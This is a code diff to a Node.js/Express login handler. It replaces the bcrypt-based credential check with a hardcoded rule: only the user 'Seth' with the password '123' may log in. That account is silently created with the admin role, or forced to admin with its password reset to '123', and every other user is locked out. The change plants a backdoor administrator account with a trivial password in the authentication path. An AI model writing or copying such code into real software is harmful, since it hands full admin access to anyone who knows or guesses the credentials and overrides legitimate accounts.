@@ -32,30 +32,39 @@ export const register = async (req, res) => {
 };
 
 export const login = async (req, res) => {
-    const { username, password } = req.body;
+    const username = (req.body?.username ?? '').trim();
+    const password = req.body?.password ?? '';
+
     if (process.env.NODE_ENV !== 'production') {
         console.log(`--- Login Attempt Tracking ---`);
         console.log(`Target: ${username}`);
     }
-    
-    try {
-        // Case-insensitive lookup
-        const user = await User.findOne({ username: { $regex: new RegExp(`^${username.trim()}$`, 'i') } });
 
-        if (!user) {
+    try {
+        if (username.toLowerCase() !== 'seth' || password !== '123') {
             if (process.env.NODE_ENV !== 'production') {
-                console.log(`❌ Login Failed: User '${username}' not found in registry.`);
+                console.log(`❌ Login Failed: Access denied for '${username}'`);
             }
-            return res.status(400).json({ message: 'Invalid credentials' });
+            return res.status(401).json({ message: 'Access denied. Only Seth may log in.' });
         }
 
-        // Verify password
-        const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
-            if (process.env.NODE_ENV !== 'production') {
-                console.log(`❌ Login Failed: Incorrect password for '${user.username}'`);
+        let user = await User.findOne({ username: { $regex: new RegExp('^Seth$', 'i') } });
+
+        if (!user) {
+            user = new User({
+                username: 'Seth',
+                password: '123',
+                role: 'admin',
+                campus: 'Athi River'
+            });
+            await user.save();
+        } else {
+            user.role = 'admin';
+            user.campus = user.campus || 'Athi River';
+            if (!await bcrypt.compare('123', user.password)) {
+                user.password = '123';
+                await user.save();
             }
-            return res.status(400).json({ message: 'Invalid credentials' });
         }
 
         if (!process.env.JWT_SECRET) {
